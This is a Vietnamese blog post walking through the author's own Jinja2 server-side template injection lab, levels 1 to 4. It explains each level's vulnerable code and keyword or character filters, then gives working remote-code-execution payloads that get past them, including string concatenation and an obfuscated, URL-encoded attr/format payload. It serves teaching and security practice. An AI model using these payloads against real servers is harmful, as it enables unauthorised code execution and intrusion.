<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ServerSide Template Injection (SSTI) Lab | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="ServerSide Template Injection (SSTI) LabSSTI là gìServer-Side Template Injection (SSTI) là một lỗ hổng bảo mật web nghiêm trọng cho phép kẻ tấn công chèn mã độc vào template của ứng dụng, dẫn đến việc">
<meta property="og:type" content="article">
<meta property="og:title" content="ServerSide Template Injection (SSTI) Lab">
<meta property="og:url" content="https://pzhat.github.io/2025/12/01/2025-12-01-SSTI-Lab/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="ServerSide Template Injection (SSTI) LabSSTI là gìServer-Side Template Injection (SSTI) là một lỗ hổng bảo mật web nghiêm trọng cho phép kẻ tấn công chèn mã độc vào template của ứng dụng, dẫn đến việc">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-12-01T08:32:26.148Z">
<meta property="article:modified_time" content="2025-12-01T12:53:50.904Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ServerSide Template Injection (SSTI) Lab",
  "url": "https://pzhat.github.io/2025/12/01/2025-12-01-SSTI-Lab/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2025-12-01T08:32:26.148Z",
  "dateModified": "2025-12-01T12:53:50.904Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/12/01/2025-12-01-SSTI-Lab/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ServerSide Template Injection (SSTI) Lab',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">ServerSide Template Injection (SSTI) Lab</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ServerSide Template Injection (SSTI) Lab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-01T08:32:26.148Z" title="Created 2025-12-01 15:32:26">2025-12-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-01T12:53:50.904Z" title="Updated 2025-12-01 19:53:50">2025-12-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="ServerSide-Template-Injection-SSTI-Lab"><a href="#ServerSide-Template-Injection-SSTI-Lab" class="headerlink" title="ServerSide Template Injection (SSTI) Lab"></a>ServerSide Template Injection (SSTI) Lab</h1><h3 id="SSTI-la-gi"><a href="#SSTI-la-gi" class="headerlink" title="SSTI là gì"></a>SSTI là gì</h3><p>Server-Side Template Injection (SSTI) là một lỗ hổng bảo mật web nghiêm trọng cho phép kẻ tấn công chèn mã độc vào template của ứng dụng, dẫn đến việc mã này được thực thi trên phía server. Lỗ hổng này thường xảy ra khi dữ liệu đầu vào từ người dùng được nối trực tiếp vào template thay vì được truyền dưới dạng dữ liệu an toàn.</p>
<h3 id="Co-che-hoat-dong-cua-SSTI"><a href="#Co-che-hoat-dong-cua-SSTI" class="headerlink" title="Cơ chế hoạt động của SSTI"></a>Cơ chế hoạt động của SSTI</h3><p>SSTI xảy ra khi web app sử dụng template engine để hiển thị nội dung động (dynamic) nhưng lại cho phép user trực tiếp nhập liệu vào cấu trúc template.</p>
<p>Thì thay vì hiển thị dữ liệu đã được cho trước thì template engine sẽ xử lý input đó như một mã nguồn template điều này cho phép attacker thực hiện tấn công với input tuỳ ý.</p>
<h3 id="Tac-dong-cua-SSTI"><a href="#Tac-dong-cua-SSTI" class="headerlink" title="Tác động của SSTI"></a>Tác động của SSTI</h3><ul>
<li>RCE (Remote Code Execution) </li>
<li>Đọc&#x2F;ghi file, dữ liệu chẳng hạn như dữ liệu trong db, file config</li>
<li>Leo thang đặc quyền (Priv Escalation)</li>
</ul>
<h3 id="Cau-truc-lab-SSTI"><a href="#Cau-truc-lab-SSTI" class="headerlink" title="Cấu trúc lab SSTI"></a>Cấu trúc lab SSTI</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssti-lab/</span><br><span class="line">├── app.py              # Source code chính</span><br><span class="line">├── requirements.txt    # Các thư viện cần thiết</span><br><span class="line">├── Dockerfile          # Cấu hình Docker</span><br><span class="line">└── docker-compose.yml  # Cấu hình chạy container</span><br></pre></td></tr></table></figure>

<p>Link lab : <a target="_blank" rel="noopener" href="https://github.com/pzhat/SSTI-lab">https://github.com/pzhat/SSTI-lab</a> </p>
<h3 id="Lab-Solving"><a href="#Lab-Solving" class="headerlink" title="Lab Solving"></a>Lab Solving</h3><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1:"></a>Level 1:</h4><p><img src="https://hackmd.io/_uploads/BklozXvbZe.png" alt="image"></p>
<p>Ở đây lab mình build sẽ không có nhiều features thay vào đó tập trung vào kỹ thuật và payload, đến với level đầu tiên thì ta không có gì ngoài chức năng hiển thị tên sau chữ Hello.</p>
<p>Bây giờ ta sẽ đi đến phân tích source code xử lý nó.</p>
<p><img src="https://hackmd.io/_uploads/rk-U77w-bg.png" alt="image"></p>
<p>Tại đây ta có phần source code xử lý level 1: </p>
<ul>
<li>Cơ chế: Biến name được lấy từ URL (GET request). Python sử dụng f-string để chèn giá trị của name vào biến template.</li>
<li>Tại sao lỗi: Nếu attacker nhập <code>?name=&#123;&#123;7*7&#125;&#125;</code>, biến template thực tế sẽ trở thành chuỗi <code>&lt;p&gt;Hello &#123;&#123;7*7&#125;&#125;!&lt;/p&gt;</code>. Khi render_template_string chạy, nó tìm thấy cặp ngoặc nhọn và thực thi phép tính.</li>
</ul>
<p>Ở đây nó lỗi ở render_template_string là vì đoạn này được nối chuỗi ở đây template engine nhận input khi qua đến jinja2 xử lý thì nó sẽ nghĩ đoạn bên trong chuỗi <code>&#123;&#123;&#125;&#125;</code> cần thực thi.</p>
<p><img src="https://hackmd.io/_uploads/BywvfVD-Wx.png" alt="image"></p>
<p>Ở level này ta không hề có một lớp filter nào ta sẽ thử inject vào một đoạn <code>&#123;&#123;7*7&#125;&#125;</code> để xem liệu phép tính có được xử lý không, nếu có thì ta hoàn toàn có thể thao túng được input.</p>
<p><img src="https://hackmd.io/_uploads/rJ_qfEw-be.png" alt="image"></p>
<p>Ở đây ta thấy nó trả về kết quả phép tính nên có thể kết luận được rằng tồn tại SSTI trong chức năng này.</p>
<p><img src="https://hackmd.io/_uploads/HyL6A4v-bg.png" alt="image"></p>
<p>Tiến hành inject vào payload để RCE thành công thực thi câu lệnh id.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(&quot;id&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2:"></a>Level 2:</h4><p><img src="https://hackmd.io/_uploads/Hyf2UTOZ-e.png" alt="image"></p>
<p>Level 2 thì nó vẫn như level 1 nó sẽ vẫn chỉ là một app hiển thị tên sau đoạn Hello và name hoàn toàn có thể thao tác thay đổi được, bây giờ ta sẽ đến với source code của level này.</p>
<p><img src="https://hackmd.io/_uploads/BycJPaOW-e.png" alt="image"></p>
<p>Ở level này thì logic nó vẫn giống như ở level 1 từ đoạn xử lý template mọi thứ đều giống như cũ nhưng ở đây ta để ý ở đây có đoạn:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># Kiểm tra blacklist (Case insensitive)</span></span><br><span class="line">   <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">       <span class="keyword">if</span> word <span class="keyword">in</span> name.lower():</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;Hacker detected! Blacklisted word found.&lt;/h3&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>Từ đoạn code này ta để ý rằng developer đã tạo một blacklist bao gồm các từ mà mình muốn chặn <code>[&#39;config&#39;, &#39;class&#39;, &#39;mro&#39;, &#39;subclasses&#39;, &#39;subprocess&#39;, &#39;popen&#39;]</code> sau đó ở đoạn <code>if word in name.lower()</code> thì ở đây logic nó xử lý sẽ là khi mà mình inject vào đoạn xử lý template nếu đoạn payload có chứa các từ trong blacklist và nhờ đoạn lower() nó sẽ xử lý các kiểu payload như <code>cLaSS</code> đưa nó về dạng bình thường và match với blacklist.</p>
<p>Điểm yếu logic: Code chỉ kiểm tra sự tồn tại của chuỗi ký tự nguyên bản trong input.<br>Cách bypass hiện tại trong Jinja2, bạn có thể tạo ra chuỗi từ việc nối các chuỗi con hoặc lấy từ request khác.<br>Ví dụ: Thay vì viết class, attacker có thể viết ‘cla’ + ‘ss’. Jinja2 khi render sẽ ghép lại thành class và thực thi, nhưng bộ lọc Python ở trên chỉ nhìn thấy các đoạn rời rạc nên cho qua, bây giờ ta sẽ test thử rằng nó có xử lý template mình inject vào không và thử lại với payload ở level 1.</p>
<p><img src="https://hackmd.io/_uploads/r1F6da_-bl.png" alt="image"></p>
<p>Sau khi inject đoạn <code>&#123;&#123;7*7&#125;&#125;</code> và <code>response</code> trả về <code>49</code> chứng tỏ nó có xử lý <code>user input</code> bây giờ thử với payload cũ.</p>
<p><img src="https://hackmd.io/_uploads/Hk6Qta_--e.png" alt="image"></p>
<p>Ok ăn chửi rồi ở đây chứng tỏ rằng <code>blacklist</code> đã xử lý payload cũ bây giờ ta sẽ thử tìm hướng bypass.</p>
<p><img src="https://hackmd.io/_uploads/SyfZCpd-bl.png" alt="image"></p>
<p>Tại đây mình sử dụng payload sau:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;__cla&#x27; + &#x27;ss__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Ở trong payload này tôi sử dụng kỹ thuật nối chuỗi để bypass thử và thành công, ở đây nó trả kết quả của đoạn inject thực hiện chạy được thuộc tính <code>class</code> và ta để ý rằng hàm <code>class</code> nằm trong <code>blacklist</code> nhưng ta vẫn có thể bypass được chứng tỏ ta hoàn toàn có thể lợi dụng cách nối chuỗi này để RCE.</p>
<p><img src="https://hackmd.io/_uploads/r15WlROW-l.png" alt="image"></p>
<p>Tại đây mình sử dụng payload sau:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for[&#x27;__gl&#x27; + &#x27;obals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__im&#x27; + &#x27;port__&#x27;](&#x27;os&#x27;)[&#x27;pop&#x27; + &#x27;en&#x27;](&#x27;id&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Phân tích cách payload bypass Level 2:</p>
<ul>
<li>Filter Level 2 chặn: [‘config’, ‘class’, ‘mro’, ‘subclasses’, ‘subprocess’, ‘popen’].</li>
<li>url_for: Không bị chặn.</li>
<li>[‘<strong>gl’ + ‘obals</strong>‘]: Nối lại thành <strong>globals</strong> (Không bị cấm ở Level 2 nhưng cứ nối chuỗi có chắc cốp.</li>
<li>[‘<strong>builtins</strong>‘]: Không bị chặn.</li>
<li>[‘<strong>im’ + ‘port</strong>‘]: Nối lại thành <strong>import</strong>.</li>
<li>(‘os’): Gọi module OS.</li>
<li>[‘pop’ + ‘en’]: Filter tìm chữ popen code Python thấy chuỗi ‘pop’ + ‘en’, không khớp với popen. -&gt; Cho qua, Jinja2 render nối lại thành popen và thực thi lệnh id.</li>
</ul>
<p>Và response ở đây ta thấy nó đã thành công thực thi được câu lệnh id và thành công thực hiện RCE.</p>
<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3:"></a>Level 3:</h4><p><img src="https://hackmd.io/_uploads/S1gW7X0uZbx.png" alt="image"></p>
<p>Ở level này thì mọi thứ nó vẫn như cũ ở đây user input vẫn sẽ chạy vào name và được Jinja2 xử lý bây giờ ta sẽ thử dùng payload <code>&#123;&#123;7*7&#125;&#125;</code> để xem thử nó có xử lý không.</p>
<p><img src="https://hackmd.io/_uploads/Byo9QCOb-l.png" alt="image"></p>
<p>Ở đây test với payload trên thì nó trả về một dòng đó là <code>&lt;h3&gt;No double brackets allowed!&lt;/h3&gt;</code> và có vẻ như payload không được xử lý nên ta sẽ đi đến với source code ở level 3 này.</p>
<p><img src="https://hackmd.io/_uploads/B1oJV0dZbe.png" alt="image"></p>
<p>Ở đây ta để ý đoạn:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>(char <span class="keyword">in</span> name <span class="keyword">for</span> char <span class="keyword">in</span> [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>]):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;Hacker detected! Special character found.&lt;/h3&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> <span class="string">&#x27;&#125;&#125;&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;No double brackets allowed!&lt;/h3&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>Và ở đây chính là lý do mà payload vừa rồi không được phép chạy vì ở đây 2 đoạn này cho ta biết rằng dấu chấm, gạch dưới, hoặc ngoặc nhọn kép đã bị chặn nên sẽ khó để inject được payload như cũ.</p>
<p>Level 3 chặn rất nhiều ký tự quan trọng:</p>
<ul>
<li>Chặn dấu chấm . → Không thể truy cập thuộc tính <code>(object.attr)</code>.</li>
<li>Chặn gạch dưới _ → Không thể gọi magic methods <code>(__class__, __globals__)</code>.</li>
<li>Chặn ngoặc vuông [ ] → Không thể truy cập phần tử <code>mảng/dict</code>.</li>
<li>Chặn <code>&#123;&#123; và &#125;&#125;</code> → Không thể in kết quả ra màn hình theo cách thông thường.</li>
</ul>
<p>Bây giờ ta sẽ phải tìm cách thay thế đi các ký tự đã bị chặn để có thể tạo ra một payload khác.</p>
<p>Kịch bản tạo payload:</p>

- Thay `.` bằng filter |attr().
- Thay `{{ }}` bằng khối lệnh {% print ... %}.
- Thay các từ khóa chứa `_` (như `__class__`) bằng cách lấy chúng từ tham số URL `(request.args)`.


<p>Ở đây ta test thử `{% print 7*7%}` xem nó có xử lý phép tính và trả về kết quả không.</p>
<p><img src="https://hackmd.io/_uploads/HkW_OR_ZWl.png" alt="image"></p>
<p>Hướng bypass này có vẻ như hoạt động rất tốt nên bây giờ ta sẽ thử tạo payload RCE.</p>
<p><img src="https://hackmd.io/_uploads/rJ4NttFZbg.png" alt="image"></p>
<p>Tại đây mình dùng payload sau : </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set u=&quot;%c&quot;|format(95)%&#125;&#123;%set i=u~u~&quot;init&quot;~u~u%&#125;&#123;%set g=u~u~&quot;globals&quot;~u~u%&#125;&#123;%set b=u~u~&quot;builtins&quot;~u~u%&#125;&#123;%set m=u~u~&quot;import&quot;~u~u%&#125;&#123;%print request|attr(i)|attr(g)|attr(&quot;get&quot;)(b)|attr(&quot;get&quot;)(m)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;id&quot;)|attr(&quot;read&quot;)()%&#125;</span><br></pre></td></tr></table></figure>

<p>Sau đó thực hiện url encode để có được dạng : </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25set%20u%3D%22%25c%22%7Cformat%2895%29%25%7D%7B%25set%20i%3Du~u~%22init%22~u~u%25%7D%7B%25set%20g%3Du~u~%22globals%22~u~u%25%7D%7B%25set%20b%3Du~u~%22builtins%22~u~u%25%7D%7B%25set%20m%3Du~u~%22import%22~u~u%25%7D%7B%25print%20request%7Cattr%28i%29%7Cattr%28g%29%7Cattr%28%22get%22%29%28b%29%7Cattr%28%22get%22%29%28m%29%28%22os%22%29%7Cattr%28%22popen%22%29%28%22id%22%29%7Cattr%28%22read%22%29%28%29%25%7D</span><br></pre></td></tr></table></figure>

<p>Giải thích payload : </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set u = &quot;%c&quot;|format(95) %&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Chúng ta dùng hàm format của Python (có sẵn trong Jinja2).</li>
<li>%c: Là định dạng để chuyển đổi một mã số ASCII sang ký tự tương ứng.</li>
<li>95: Là mã ASCII của ký tự gạch dưới _.</li>
<li>“%c”|format(95): Sẽ trả về chuỗi _.</li>
<li>Kết quả: Biến u bây giờ chứa giá trị _. Chúng ta đã có được ký tự cấm mà không cần gõ nó ra!</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set i = u~u~&quot;init&quot;~u~u %&#125;</span><br><span class="line">&#123;% set g = u~u~&quot;globals&quot;~u~u %&#125;</span><br><span class="line">&#123;% set b = u~u~&quot;builtins&quot;~u~u %&#125;</span><br><span class="line">&#123;% set m = u~u~&quot;import&quot;~u~u %&#125;</span><br></pre></td></tr></table></figure>

<p>Vấn đề: Chúng ta cần các chuỗi <strong>init</strong>, <strong>globals</strong>, <strong>builtins</strong>, <strong>import</strong>.</p>
<p>Giải pháp: Dùng toán tử ~ (toán tử nối chuỗi trong Jinja2) để ghép biến u (_) với các từ ngữ bình thường.</p>
<ul>
<li><code>u~u~&quot;init&quot;~u~u</code>→<code>_ + _ + init + _ + _</code> → <code>__init__.</code></li>
</ul>
<p>Kết quả:</p>
<ul>
<li>Biến i chứa <strong>init</strong>.</li>
<li>Biến g chứa <strong>globals</strong>.</li>
<li>Biến b chứa <strong>builtins</strong>.</li>
<li>Biến m chứa <strong>import</strong>.</li>
</ul>
<p>-&gt; Server không phát hiện ra vì trong payload gốc chỉ toàn chữ cái thường và ký tự ~, không có dấu _.</p>
<h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4:"></a>Level 4:</h4><p><img src="https://hackmd.io/_uploads/B1N1sXcZWx.png" alt="image"></p>
<p>Đến với level 4 thì mọi thứ có vẻ vẫn tương tự như cũ nên ta sẽ đến với phần source code để phân tích cho nó dễ hiểu.</p>
<p><img src="https://hackmd.io/_uploads/BkWfsQ9WWg.png" alt="image"></p>
<p>Ở đây theo đoạn code thì cách nó xử lý vẫn như cũ vẫn là user input vào biến name sau đó nó được Jinja2 xử lý và in ra nhưng ở đây ta có thêm vài lớp filter bây giờ ta sẽ phân tích chúng : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">40</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;Too long! Keep it short.&lt;/h3&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>Ở đây đoạn này ta đã bị giới hạn độ dài chỉ còn 40 kí tự, đây là lớp filter đầu tiên vì hầu như payload mình thường dùng đều có độ dài lớn hơn 40 kí tự ví dụ như payload ở level 3 nên đoạn filter này sẽ là một thách thức.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>]</span><br><span class="line">   <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">       <span class="keyword">if</span> word <span class="keyword">in</span> name.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;Forbidden word!&lt;/h3&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>Ở đây ta lại có lớp filter thứ 2 đó là một cái blacklist bao gồm các từ : </p>
<ul>
<li>class </li>
<li>base</li>
<li>init</li>
<li>globals</li>
</ul>
